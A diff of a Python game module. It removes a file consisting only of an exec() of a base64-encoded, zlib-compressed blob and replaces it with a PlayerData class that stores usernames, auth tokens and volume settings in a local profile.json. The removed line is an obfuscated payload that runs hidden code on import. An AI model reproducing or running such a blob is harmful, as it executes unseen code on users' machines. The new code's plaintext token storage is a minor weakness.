@@ -1,2 +1,63 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'eJylVU1vnDAQve+vcLkAEkHbQ6UKaW859tD7amU5YDZOwbZskw9F+e8Zm13A2CGJ6gtm/OaNZ3gzsF4KZZDQOzbuHrTgu1aJHpVESiyJudfocnamBltjQwzBDVO7Xd0RrdHfjrxQdQvWaodgNbRFGDPODMaZpl2bj3a77Gs5aKo46Sk6oCTxj4z4R3nErkTn4NLFWh3Wg1KUG9wTaTG3A2cE/RnIGnd37vGj6AYXeV/+8k9Jf8csy4T4We59hCaPtMGkrsXAjQbE8TQBfKRUomUddfUDnNCl3ZUPgvFsXcYsLyCv0aG09U9yn6wTpMEXQJb7EW2tvfNVvVk7BafPTBudBfdboO0y6sU32PXEIA8hKQ/dC5SqtECU16Jh/HxIB9Pe/E5zRDRqQyZ3acgcqmJzdcllbR7FrcVi/UooX5ZcjQmULtlwvspp9nSWz9w8ocy+sxkIQD8bDIGYZhb/CJhAZxtMgehmJv8ImI6nOBGowK8l4c2iQPGvNOfSNNgLlXlkxYLJD0+faypNyC5hagTGSc7xcAWa442hPJFzYdA90cQYdYGnfnXSlcw/begPALBHrVDIPhmPouA6sD+m1wunJ/TjMF1/M0LJOMBMti/Q6+xfLXJPXfJgcs+3yDiwjB+Ng6C5v62M/1PEpfNfA9q5oyv/QkUIHVu4WgSJgBa9Wq2bOgJfNWUV6+KI26oDK/uP3NBg2KFv3tv2mH36xph1s7UZepnZkhdoMWFjXek6clJQ3VGi/A+soz/yL/XP4tf1Dq5taLE=')))
+import os
+import json
+from .app_paths import get_app_data_dir
+
+class PlayerData:
+    def __init__(self):
+        self.username = ""
+        self.token = ""
+        self.role = "player"
+        self.current_map = "Dunia Luar"
+        self.bgm_volume = 0.5
+        self.ambient_volume = 1.0
+        self.sfx_volume = 1.0
+        self.voice_volume = 1.0
+        self.saved_accounts = []
+        
+        self.profile_path = os.path.join(get_app_data_dir(), "profile.json")
+        self.load_profile()
+        
+    def load_profile(self):
+        if os.path.exists(self.profile_path):
+            try:
+                with open(self.profile_path, 'r', encoding='utf-8') as f:
+                    data = json.load(f)
+                    self.username = data.get("username", "")
+                    self.token = data.get("token", "")
+                    self.bgm_volume = data.get("bgm_volume", 0.5)
+                    self.ambient_volume = data.get("ambient_volume", 1.0)
+                    self.sfx_volume = data.get("sfx_volume", 1.0)
+                    self.voice_volume = data.get("voice_volume", 1.0)
+                    self.saved_accounts = data.get("saved_accounts", [])
+                    if self.username and self.token:
+                        self.add_saved_account(self.username, self.token)
+            except:
+                pass
+                
+    def add_saved_account(self, username, token):
+        if not hasattr(self, 'saved_accounts'):
+            self.saved_accounts = []
+        self.saved_accounts = [acc for acc in self.saved_accounts if acc['username'] != username]
+        self.saved_accounts.insert(0, {'username': username, 'token': token})
+        
+    def save_profile(self):
+        try:
+            if self.username and self.token:
+                self.add_saved_account(self.username, self.token)
+            data = {
+                "username": self.username,
+                "token": self.token,
+                "bgm_volume": self.bgm_volume,
+                "ambient_volume": self.ambient_volume,
+                "sfx_volume": self.sfx_volume,
+                "voice_volume": self.voice_volume,
+                "saved_accounts": getattr(self, 'saved_accounts', [])
+            }
+            with open(self.profile_path, 'w', encoding='utf-8') as f:
+                json.dump(data, f)
+        except:
+            pass
+
+    def clear_saved_accounts(self):
+        self.saved_accounts = []
+        self.save_profile()
